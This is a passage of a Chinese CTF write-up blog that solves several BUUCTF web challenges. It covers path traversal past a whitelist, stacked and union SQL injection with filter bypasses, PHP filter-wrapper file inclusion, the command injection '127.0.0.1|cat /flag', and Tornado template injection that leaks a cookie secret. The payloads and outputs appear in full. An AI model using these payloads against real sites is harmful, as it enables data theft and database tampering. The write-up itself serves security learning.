class=\"variable\">$file</span>))&#123;</span><br><span class=\"line\"><span class=\"keyword\">if</span>( strpos( <span class=\"variable\">$file</span>, <span class=\"string\">&quot;woofers&quot;</span> ) !==  <span class=\"literal\">false</span> || strpos( <span class=\"variable\">$file</span>, <span class=\"string\">&quot;meowers&quot;</span> ) !==  <span class=\"literal\">false</span> || strpos( <span class=\"variable\">$file</span>, <span class=\"string\">&quot;index&quot;</span>))&#123;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">include</span> (<span class=\"variable\">$file</span> . <span class=\"string\">&#x27;.php&#x27;</span>);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到if判断中需要字符串包含<code>woofers</code>、<code>meowers</code>、<code>index</code>，那么我们只需要在filter伪协议中插入字符串绕过判断即可。</p>\n<p><strong>需要知道的</strong>：filter可以设定一个或多个过滤器名称，以管道符<code>\\</code>分隔，所以构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php?category=php://filter/meowers/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>\n\n<p>读出来以后解密即可获得flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310181106.png\"></p>\n<p>搜索的时候学到了一个其他的截断</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zip://test.zip#hello.html.php</span><br></pre></td></tr></table></figure>\n\n<p>代表当前目录下的test.zip压缩包里面的hello.html.php，于是包含成功。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>寒假横向刷题（尽量）<br><a href=\"https://buuoj.cn/challenges#\">BUUCTF</a><br>💗🧡💛💚💙💜🤎🖤🤍<br><strong>题都写这一个里面了，可以先用<kbd>Ctrl</kbd>+<kbd>F</kbd>搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨</strong> </p>\n<h1 id=\"2021-01-15\"><a href=\"#2021-01-15\" class=\"headerlink\" title=\"2021.01.15\"></a>2021.01.15</h1><h1 id=\"HCTF-2018-WarmUp\"><a href=\"#HCTF-2018-WarmUp\" class=\"headerlink\" title=\"[HCTF 2018]WarmUp\"></a>[HCTF 2018]WarmUp</h1><p>进到靶机一个硕大的滑稽，查看源码有提示source.php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101413.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">    class emmm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        public static function checkFile(&amp;$page)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class=\"line\">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class=\"line\">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class=\"line\">                return false;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            if (in_array($page, $whitelist)) &#123;</span><br><span class=\"line\">                return true;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            $_page = mb_substr(</span><br><span class=\"line\">                $page,</span><br><span class=\"line\">                0,</span><br><span class=\"line\">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class=\"line\">            );</span><br><span class=\"line\">            if (in_array($_page, $whitelist)) &#123;</span><br><span class=\"line\">                return true;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            $_page = urldecode($page);</span><br><span class=\"line\">            $_page = mb_substr(</span><br><span class=\"line\">                $_page,</span><br><span class=\"line\">                0,</span><br><span class=\"line\">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class=\"line\">            );</span><br><span class=\"line\">            if (in_array($_page, $whitelist)) &#123;</span><br><span class=\"line\">                return true;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class=\"line\">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class=\"line\">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class=\"line\">        exit;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>发现白名单有source.php和hint.php，先去查看一下hint.php</p>\n<blockquote>\n<p>flag not here, and flag in ffffllllaaaagggg</p>\n</blockquote>\n<p>分析源码</p>\n<ul>\n<li>判断<code>$_REQUEST[&#39;file&#39;]</code>对象为空且为字符串</li>\n<li>执行emmm类中的<strong>checkFile</strong>方法判断是否在白名单（确保函数返回是true）</li>\n<li>文件包含</li>\n</ul>\n<p>checkFile函数中字符串截取判断是否在白名单（代码17-24和26-34）所以有两种绕过方法。</p>\n<ol>\n<li>第一种</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>\n\n<p>字符串截取将原字符串尾部加上<code>?</code>再截取第一个<code>?</code>之前的内容。所以需要在构造payload时问号前需要是白名单里的文件。问号之后，猜测flag位置在根目录下，所以使用尽可能多的<code>../</code>返回上级目录。</p>\n<ol start=\"2\">\n<li> 第二种</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg</span><br></pre></td></tr></table></figure>\n\n<p>将第一种payload使用urlencode编码即可。</p>\n<hr>\n<h1 id=\"强网杯-2019-随便注\"><a href=\"#强网杯-2019-随便注\" class=\"headerlink\" title=\"[强网杯 2019]随便注\"></a>[强网杯 2019]随便注</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120094248.png\"></p>\n<p>根据题目尝试sql注入，单引号报错，单引号加注释无报错，说明存在sql注入，当测试输入select时返回过滤的黑名单：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>\n\n<p>这道题使用的是堆叠注入，原理</p>\n<blockquote>\n<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>\n</blockquote>\n<p>查看数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;show databases;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095211.png\"></p>\n<p>查看当前库下的表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;show tables;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095339.png\"></p>\n<p>查看两张表字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;show columns from words;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095607.png\"></p>\n<p>还有一种查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;desc `1919810931114514`;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095839.png\"></p>\n<p>找到了flag在的字段，接下来就是如何获取该字段的值。顺带一提，根据表的结构，初步判断默认查询的是<strong>word</strong>表中的字段，而flag在<strong>1919810931114514</strong>表中。</p>\n<p>网上找到的两种方法，分别是修改表名和使用预处理语句。</p>\n<ol>\n<li>使用<a href=\"https://www.cnblogs.com/geaozhang/p/9891338.html\">预处理</a>语句</li>\n</ol>\n<p>因为select被过滤了，但是可以使用char函数，char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char(115,101,108,101,99,116)</span><br></pre></td></tr></table></figure>\n\n<p>根据预处理语句格式构造payload</p>\n<ul>\n<li>创建一个<strong>sqli</strong>字符串值为查询sql语句，使用预处理语句赋值并执行。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27;* from `1919810931114514`&#x27;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>不使用变量</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;PREPARE sqli FROM CONCAT(&#x27;s&#x27;,&#x27;elect&#x27;,&#x27; * from `1919810931114514`&#x27;);EXECUTE sqli; #</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>还有一种</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;SET @sqli = CONCAT(&#x27;s&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;e&#x27;,&#x27;c&#x27;,&#x27;t&#x27;,&#x27; * from `1919810931114514`&#x27;);PREPARE haha FROM@sqli ;EXECUTE haha; #</span><br></pre></td></tr></table></figure>\n\n<p>主要区别在于过滤的绕过方式，不要拘泥于一种方式。</p>\n<ol start=\"2\">\n<li>修改表名</li>\n</ol>\n<p>修改表名的思路是：默认查询的是<strong>word</strong>表第一个字段，所以把<strong>word</strong>表修改为其他名称，将flag所在的<strong>1919810931114514</strong>表名修改为<strong>word</strong>。</p>\n<p>网上payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0&#x27;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</span><br></pre></td></tr></table></figure>\n\n<p>自己构造的payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0&#x27;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) #</span><br></pre></td></tr></table></figure>\n\n<p>之后执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>\n\n<p>查询表所有字段值即可。</p>\n<hr>\n<h1 id=\"极客大挑战-2019-EasySQL\"><a href=\"#极客大挑战-2019-EasySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]EasySQL\"></a>[极客大挑战 2019]EasySQL</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101528.png\"></p>\n<p>用户名密码，尝试万能密码。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;or 1=1 #</span><br><span class=\"line\">随便密码</span><br></pre></td></tr></table></figure>\n\n<p>一个万能密码的参考:<a href=\"https://www.cnblogs.com/pass-A/p/11134988.html\">https://www.cnblogs.com/pass-A/p/11134988.html</a></p>\n<hr>\n<h1 id=\"极客大挑战-2019-Havefun\"><a href=\"#极客大挑战-2019-Havefun\" class=\"headerlink\" title=\"[极客大挑战 2019]Havefun\"></a>[极客大挑战 2019]Havefun</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101733.png\"></p>\n<p>直接源码找到php代码。payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?cat=dog</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"SUCTF-2019-EasySQL\"><a href=\"#SUCTF-2019-EasySQL\" class=\"headerlink\" title=\"[SUCTF 2019]EasySQL\"></a>[SUCTF 2019]EasySQL</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120102317.png\"></p>\n<p>单引号无报错，尝试堆叠注入可以回显。</p>\n<p>和 [强网杯 2019]随便注这道题一样查库查表查字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;show databases;</span><br><span class=\"line\">1;show tables;</span><br></pre></td></tr></table></figure>\n\n<p>但是执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;desc `Flag`;</span><br><span class=\"line\">1;show columns from Flag;</span><br></pre></td></tr></table></figure>\n\n<p>返回了”Nonono.“测试出被过滤了：desc、from、Flag。</p>\n<p>接下来的都是抄网上的预期解也是第一次见。</p>\n<p>比赛时源码泄露</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select $_GET[&#x27;query&#x27;] || flag from flag</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode<br>模式：pipes_as_concat 来实现oracle 的一些功能</p>\n</blockquote>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>\n\n<p>非预期解</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*,1 </span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"ACTF2020-新生赛-Include\"><a href=\"#ACTF2020-新生赛-Include\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Include\"></a>[ACTF2020 新生赛]Include</h1><p>不截图了，进入靶机只有一个<strong>tips</strong>等着被点。跳转以后看url中参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=flag.php</span><br></pre></td></tr></table></figure>\n\n<p>页面内容只有</p>\n<blockquote>\n<p>Can you find out the flag?</p>\n</blockquote>\n<p>立马想到使用php伪协议读文件内容。使用filter过滤器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n<p>得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo=</span><br></pre></td></tr></table></figure>\n\n<p>解密得到flag</p>\n<hr>\n<h1 id=\"极客大挑战-2019-Secret-File\"><a href=\"#极客大挑战-2019-Secret-File\" class=\"headerlink\" title=\"[极客大挑战 2019]Secret File\"></a>[极客大挑战 2019]Secret File</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103724.png\"></p>\n<p>查看源码，又一个背景是黑色的超链接跳转到 Archive_room.php。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103842.png\"></p>\n<p>查看源码SECRET跳转的是action.php。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103907.png\"></p>\n<p>但是跳转以后是url地址为end.php，所以中间跳过了一个页面，使用bp抓包查看。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104246.png\"></p>\n<p>stristr()函数返回字符串中子串第一次出现位置之后的内容，简而言之还是过滤。</p>\n<p>同样使用php伪协议filter过滤器读取文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure>\n\n<p>解密得到网页源码，flag在其中。</p>\n<hr>\n<h1 id=\"极客大挑战-2019-LoveSQL\"><a href=\"#极客大挑战-2019-LoveSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]LoveSQL\"></a>[极客大挑战 2019]LoveSQL</h1><p>顶端の告诫：用 sqlmap 是没有灵魂的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104703.png\"></p>\n<p>尝试万能密码（其实没卵用）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;or 1=1 #</span><br><span class=\"line\">任意密码</span><br></pre></td></tr></table></figure>\n\n<p>这道题是常规的sql注入，测注入点、查字段数、爆库、爆字段值、爆表。组合拳</p>\n<p>字段数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; order by 3 #</span><br></pre></td></tr></table></figure>\n\n<p>爆库：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class=\"line\"></span><br><span class=\"line\">geekuser,l0ve1ysq1</span><br></pre></td></tr></table></figure>\n\n<p>爆字段值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;l0ve1ysq1&#x27; #</span><br><span class=\"line\"></span><br><span class=\"line\">id,username,password</span><br></pre></td></tr></table></figure>\n\n<p>爆表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag&#123;c4e8849c-e0e3-4e0d-b701-26a5abeec46a&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"2021-01-21\"><a href=\"#2021-01-21\" class=\"headerlink\" title=\"2021.01.21\"></a>2021.01.21</h1><h1 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h1><p><a href=\"https://braindance.tk/2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/\">传送门</a></p>\n<hr>\n<h1 id=\"ACTF2020-新生赛-Exec\"><a href=\"#ACTF2020-新生赛-Exec\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Exec\"></a>[ACTF2020 新生赛]Exec</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121090002.png\"></p>\n<p>肯定是尝试管道符</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1|cat /flag</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"护网杯-2018-easy-tornado\"><a href=\"#护网杯-2018-easy-tornado\" class=\"headerlink\" title=\"[护网杯 2018]easy_tornado\"></a>[护网杯 2018]easy_tornado</h1><p>打开页面三个超链接</p>\n<blockquote>\n<p>/flag.txt</p>\n<p>/welcome.txt</p>\n<p>hints.txt</p>\n</blockquote>\n<p>内容分别是</p>\n<blockquote>\n<p>flag in /fllllllllllllag</p>\n<p>render</p>\n<p>md5(cookie_secret+md5(filename))</p>\n</blockquote>\n<p>进入hints.txt注意到url地址此时为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/file?filename=/hints.txt&amp;filehash=2a84a09bc1d5e3d8745131754ff208fa</span><br></pre></td></tr></table></figure>\n\n<p>再根据hints.txt文件的内容，推断可以使用url方式访问文件，但是需要提供<strong>filehash</strong>值，加密的方法即hints.txt的内容：md5(cookie_secret+md5(filename))。flag文件的名称<code>filename</code>有了，接下来就是获取<code>cookie_secret</code>的值。</p>\n<p>接下来触及到盲区了，获取cookie_secret是看wp。</p>\n<blockquote>\n<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p>\n</blockquote>\n<blockquote>\n<p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p>\n</blockquote>\n<p>获取cookie_secret的payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121091616.png\"></p>\n<p>获得cookie_secret的值为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eb326d39-cd67-47bd-b2d3-71125996417b</span><br></pre></td></tr></table></figure>\n\n<p>根据hints.txt的url验证一下是如何加密的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092122.png\"></p>\n<p>选中的蓝色部分是<code>/hints.txt</code>加密后的md5值。推断出filehash格式以后直接访问flag文件，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/file?filename=/hints.txt&amp;filehash=2a84a09bc1d5e3d8745131754ff208fa</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 